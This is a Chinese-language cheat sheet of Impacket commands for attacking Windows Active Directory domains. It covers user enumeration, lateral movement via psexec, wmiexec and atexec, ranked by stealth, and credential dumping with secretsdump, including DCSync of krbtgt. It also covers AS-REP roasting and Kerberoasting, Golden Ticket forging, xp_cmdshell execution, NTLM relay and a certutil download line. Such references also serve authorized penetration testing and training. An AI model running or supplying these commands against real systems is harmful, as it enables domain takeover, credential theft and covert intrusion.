# Impacket 速查手册

> 安装: `pip install impacket` 或 `git clone https://github.com/fortra/impacket`

> **last_updated**: 2026-06-04 | **tested_against**: Impacket 0.10
---

## 信息收集

```bash
# 域用户列表 (无需凭据)
lookupsid.py anonymous@<DC_IP>
# → 枚举所有域SID→用户

# 域信息
samrdump.py <domain>/<user>:<pass>@<DC_IP>
```

## 横向移动

```bash
# === psexec (写服务+启动 → ★ 最常用) ===
psexec.py <domain>/<user>:<pass>@<target>
psexec.py <domain>/<user>@<target> -hashes :<NTLM_HASH>
psexec.py -k -no-pass <domain>/<user>@<target>       # Kerberos

# === wmiexec (WMI → 较隐蔽) ===
wmiexec.py <domain>/<user>:<pass>@<target>
wmiexec.py <domain>/<user>@<target> -hashes :<NTLM_HASH>

# === smbexec (服务 → 有日志) ===
smbexec.py <domain>/<user>:<pass>@<target>

# === atexec (计划任务 → 最隐蔽, 无交互) ===
atexec.py <domain>/<user>:<pass>@<target> "whoami"
atexec.py <domain>/<user>@<target> -hashes :<NTLM_HASH> "cmd /c certutil -urlcache ..."

# === dcomexec (DCOM → Win10/2016+) ===
dcomexec.py <domain>/<user>:<pass>@<target>
dcomexec.py <domain>/<user>@<target> -hashes :<NTLM_HASH>
```

## 凭据窃取

```bash
# === secretsdump — ★ 最强大的凭据dump ===

# 从SAM/SYSTEM注册表导出
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
secretsdump.py -sam sam.hive -system system.hive LOCAL

# 远程dump (需管理员)
secretsdump.py <domain>/<user>:<pass>@<target>
secretsdump.py <domain>/<user>@<target> -hashes :<NTLM_HASH>

# NTDS.dit dump (域控)
secretsdump.py <domain>/<admin>:<pass>@<DC_IP> -just-dc-ntlm

# DCSync (仅特定用户)
secretsdump.py <domain>/<user>:<pass>@<DC_IP> -just-dc-user krbtgt
```

## Kerberos

```bash
# === GetNPUsers (AS-REP Roasting) ===
GetNPUsers.py <domain>/ -usersfile users.txt -outputfile asrep.txt
GetNPUsers.py <domain>/ -dc-ip <DC_IP> -request

# === GetUserSPNs (Kerberoasting) ===
GetUserSPNs.py <domain>/<user>:<pass> -request -outputfile tgs.txt
GetUserSPNs.py <domain>/<user> -hashes :<NTLM> -request

# === getTGT (获取TGT) ===
getTGT.py <domain>/<user>:<pass>
getTGT.py <domain>/<user> -hashes :<NTLM>
export KRB5CCNAME=<user>.ccache

# === ticketer (Golden Ticket) ===
ticketer.py -domain-sid <SID> -domain <domain> -nthash <KRBTGT_HASH> Administrator
```

## 其他

```bash
# === SMB工具 ===
smbclient.py <domain>/<user>:<pass>@<target>            # SMB shell
smbclient.py <domain>/<user>@<target> -hashes :<NTLM>

# === mssqlclient ===
mssqlclient.py <domain>/<user>:<pass>@<target>
# → enable_xp_cmdshell → 命令执行

# === reg (远程注册表) ===
reg.py <domain>/<user>:<pass>@<target> query -keyName HKLM\SOFTWARE

# === rpcdump ===
rpcdump.py <target> -hashes :<NTLM>                     # 枚举RPC接口

# === ntlmrelayx (NTLM 中继) ===
ntlmrelayx.py -t smb://<target> -smb2support
ntlmrelayx.py -t ldap://<DC> -smb2support --dump-domain
```

---

*参考: Impacket 官方文档 + 实战经验*
